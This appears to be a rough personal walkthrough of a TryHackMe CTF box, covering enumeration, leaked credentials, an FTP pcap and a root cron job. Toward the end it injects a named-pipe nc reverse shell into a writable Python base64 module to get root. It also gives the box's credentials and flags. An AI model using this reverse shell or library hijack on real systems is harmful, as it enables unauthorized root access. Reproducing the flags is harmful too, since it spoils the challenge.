Machine IP 10.10.151.99

nmap -sC -sC -Pn 10.10.151.99 & nmap -sV 10.10.151.99
results: Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-13 08:54 EST
Nmap scan report for 10.10.151.99
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.70 seconds
Side note, the first results in nmap returned 
3072 c2842ac1225a10f16616dda0f6046295 (RSA)
|   256 429e2ff63e5adb51996271c48c223ebb (ECDSA)
|_  256 2ea0a56cd983e0016cb98a609b638672 (ED25519)
In case brute forcing is necessary. 


1.1	What is the user flag? 
Site just seems to be where someone is hosting their photogrpphy portfolio with pricing. 
Going to start with gobuster 
gobuster dir -u 10.10.151.99 -w  /usr/share/wordlists/dirb/common.txt
no robots, nothing returned of importance. 
In searching pircing/pricingindex.html. Goiing back a page, I found an index page for pricing.
Where there is a note that says 
J,
Please stop leaving notes randomly on the website
-RP
Makes me think there are more notes or hints left around the site. The same was not true about the galleryindex. 
Also who is J and who is RP. 


One thing of note is that I found http://10.10.151.99/server-status through the buster and it has returned a forbidden. Maybe a dud or a nother hint?

Want to move to SSH, but not enough info to bruteforce or go around with. 
Found ED25519 key fingerprint is SHA256:cssZyBk7QBpWU8cMEAJTKWPfN5T2yIZbqgKbnrNEols may be able to bruteforce the password, but still unknown about the username. 
──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/dirb/rockyou.txt --format=raw-sha256 /home/kali/Desktop/crackyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2024-01-13 09:17) 0g/s 22767Kp/s 22767Kc/s 22767KC/s (4510458faruk)..*7¡Vamos!
Session completed. 


┌──(kali㉿kali)-[~]
└─$
Unsure on why the sha256 is not going through? Found a hint and it seems we need to proceed with the numbers found at the gallery earlier. Plgged in a word list that consisted of trying all of the numbers from 00-99 on the website. 
─(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u 10.10.151.99/static/ -w  num.txt                   
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.151.99/static/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                num.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2024/01/13 09:22:32 Starting gobuster in directory enumeration mode
===============================================================
/3                    (Status: 200) [Size: 421858]
/6                    (Status: 200) [Size: 2115495]
/1                    (Status: 200) [Size: 2473315]
/7                    (Status: 200) [Size: 5217844]
/5                    (Status: 200) [Size: 1426557]
/9                    (Status: 200) [Size: 1190575]
/00                   (Status: 200) [Size: 9465315]

Progress: 9 / 10 (90.00%)[ERROR] 2024/01/13 09:22:43 [!] context deadline exceeded (Client.Timeout or context cancellation while reading body)
[ERROR] 2024/01/13 09:22:43 [!] context deadline exceeded (Client.Timeout or context cancellation while reading body)
[ERROR] 2024/01/13 09:22:43 [!] context deadline exceeded (Client.Timeout or context cancellation while reading body)

===============================================================
2024/01/13 09:22:43 Finished
===============================================================
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Desktop]

It was able to find the following. http://10.10.151.99/static/00

dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts


-redo the editing on #4

-remove /dev1243224123123 

Odd little standouts. 
http://10.10.151.99/dev1243224123123/ returns a logon. 

Really easy to note that checking the page source of any open notes or login. We have view-source:http://10.10.151.99/dev1243224123123/dev.js

Contains
  if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";

This returns 

dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies  \\?\\
-stay up to date on patching
-change ftp port to normal port

The other page returns noting of importance. 

That is huge, which just means ftp is open but not on the original port 20 or 21 that it is normally set. We need to now change our scan on the nmap scan and scann all 65535.
nmap -p- 10.10.151.99
10 minutes 
20 minutes.
Going to skip ahead for the time being, will specify a range of ports next time. 
nmap -p 35000-40000 10.10.151.99
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-13 09:46 EST
Nmap scan report for 10.10.151.99
Host is up (0.18s latency).
Not shown: 5000 closed tcp ports (conn-refused)
PORT      STATE SERVICE
37370/tcp open  unknown

Port number for ftp is 37370

Going to try and ftp with  ftp 10.10.151.99  
Returned an error, need to specify the port.

Asking for user & pass 
As early said, it seems they reuse passwords, so we can use the following   if (username === "siemDev" && password === "california") {

┌──(kali㉿kali)-[~]
└─$ ftp 10.10.151.99       
ftp: Can't connect to `10.10.151.99:21': Connection refused
ftp: Can't connect to `10.10.151.99:ftp'
ftp> 
zsh: suspended  ftp 10.10.151.99
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.151.99 37370
Connected to 10.10.151.99.
220 (vsFTPd 3.0.3)
Name (10.10.151.99:kali): siemDev
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

Found with ls 
-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
226 Directory send OK.
Ran the mget *.* to cat all files. 
Just some siem logs. 

Going to skip the search, but searched through files that conbtained insecure protocols like http, ftp, and telnet and searched theough twhat was provided.
Found 2260 and 2335 anything with a post command. Just meaning that it was inputted into the site in cleartext. 

2335 contained open username and password for valledDev.
Uname = ValletDev 
PSW ph0t0s1234

Because everything is in use, we can try both credentials for ssh. 

Frame 2335: 605 bytes on wire (4840 bits), 605 bytes captured (4840 bits) on interface any, id 0
Linux cooked capture v1
Internet Protocol Version 4, Src: 192.168.111.136, Dst: 192.168.111.136
Transmission Control Protocol, Src Port: 47096, Dst Port: 80, Seq: 1, Ack: 1, Len: 537
Hypertext Transfer Protocol
    POST /index.html HTTP/1.1\r\n
        [Expert Info (Chat/Sequence): POST /index.html HTTP/1.1\r\n]
        Request Method: POST
        Request URI: /index.html
        Request Version: HTTP/1.1
    Host: 192.168.111.136\r\n
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n
    Accept-Language: en-US,en;q=0.5\r\n
    Accept-Encoding: gzip, deflate\r\n
    Content-Type: application/x-www-form-urlencoded\r\n
    Content-Length: 42\r\n
    Origin: http://192.168.111.136\r\n
    Connection: keep-alive\r\n
    Referer: http://192.168.111.136/index.html\r\n
    Upgrade-Insecure-Requests: 1\r\n
    \r\n
    [Full request URI: http://192.168.111.136/index.html]
    [HTTP request 1/2]
    [Response in frame: 2337]
    [Next request in frame: 2339]
    File Data: 42 bytes
HTML Form URL Encoded: application/x-www-form-urlencoded
    Form item: "uname" = "valleyDev"
        Key: uname
        Value: valleyDev
    Form item: "psw" = "ph0t0s1234"
        Key: psw
        Value: ph0t0s1234
    Form item: "remember" = "on"
        Key: remember
        Value: on

Had some issues with the formatting of the creds, but got it after catting the net file out. Found the user.txt with less user.txt 

THM{k@l1_1n_th3_v@lley}



2.2 What is the root flag?

Of course we have to check what we can do.
valleyDev@valley:~$ ls -la
total 24
drwxr-xr-x 5 valleyDev valleyDev 4096 Mar 13  2023 .
drwxr-xr-x 5 root      root      4096 Mar  6  2023 ..
-rw-r--r-- 1 root      root         0 Mar 13  2023 .bash_history
drwx------ 3 valleyDev valleyDev 4096 Mar 20  2023 .cache
drwx------ 4 valleyDev valleyDev 4096 Mar  6  2023 .config
drwxr-xr-x 3 valleyDev valleyDev 4096 Mar  6  2023 .local
-rw-rw-rw- 1 root      root        24 Mar 13  2023 user.txt
Looking around the server, we have siemDev  valley  valleyAuthenticator  valleyDev.
The only thing we can “access” is valleyAuthenticator . 
Tried to access the Autheticator but its asking for a username. 
Tried the username swe have in our notes, but it looks like this is different. 
Cant less, cant cd, going to try and download and access the file through a reverse shell with nc. 

I like this 
valleyAuthenticator: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header

──(kali㉿kali)-[~]
└─$ wget http://10.10.151.99:8000/valleyAuthenticator
--2024-01-13 10:26:46--  http://10.10.151.99:8000/valleyAuthenticator
Connecting to 10.10.151.99:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 749128 (732K) [application/octet-stream]
Saving to: ‘valleyAuthenticator’

valleyAuthenticator                                  100%[====================================================================================================================>] 731.57K  1.40MB/s    in 0.5s    

2024-01-13 10:26:47 (1.40 MB/s) - ‘valleyAuthenticator’ saved [749128/749128]

                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~]
Unpacked the file and it’s a massive file.
Just searched the file for username and password with what looks to be two hadshes up above. 
Cracking the hashes return liberty123 and valley. Goinmg to go back into ssh and plug that into the vallkey username and password. Going to need to finish the script 


Restarted the machine, new ip is 
10.10.97.11
We need to then check the crontabs/
valleyDev@valley:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
1  *    * * *   root    python3 /photos/script/photosEncrypt.py



#
valleyDev@valley:~$  
supernice because we can run possibly escualte privleage with this photosencrypt. 
Needing to cat the file out.
valleyDev@valley:~$ cat /photos/script/photosEncrypt.py
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
        image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
        with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
        encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
        output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
        with open(output_path, "wb") as output_file:
          output_file.write(encoded_image_data)
valleyDev@valley:~$


need to two things. A file that we have permission to write to.


A python3 file we can also access. 
Using the “locate” function we can locate 
/usr/lib/python3.8/base64.py
Which when checking with -la .We have -rwxrwxr-x which just means we can write out to the file. 
Had to look up the command when importing our scripts but it is located here 


https://gtfobins.github.io/gtfobins/python/


we need to add 
import os
import re
import struct
import binascii
import os
os.system('rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.7.227 4242 >/tmp/f'

__all__ = [
    # Legacy interface exports traditional RFC 2045 Base64 encodings
    'encode', 'decode', 'encodebytes', 'decodebytes',
    # Generalized interface for other encodings
    'b64encode', 'b64decode', 'b32encode', 'b32decode',
    'b16encode', 'b16decode',
    # Base85 and Ascii85 encodings
    'b85encode', 'b85decode', 'a85encode', 'a85decode',
    # Standard Base64 encoding
    'standard_b64encode', 'standard_b64decode',
    # Some common Base64 alternatives.  As referenced by RFC 3458, see thread
    # starting at:
    #
    # http://zgp.org/pipermail/p2p-hackers/2001-September/000316.html
    'urlsafe_b64encode', 'urlsafe_b64decode',
]
Because it is set in cron, we have to wait for the connection to come back to. 
Now that the we have the listerner setup we are moved to root.
We can cat out the root flag which is. 




THM{v@lley_0f_th3_sh@dow_0f_pr1v3sc}
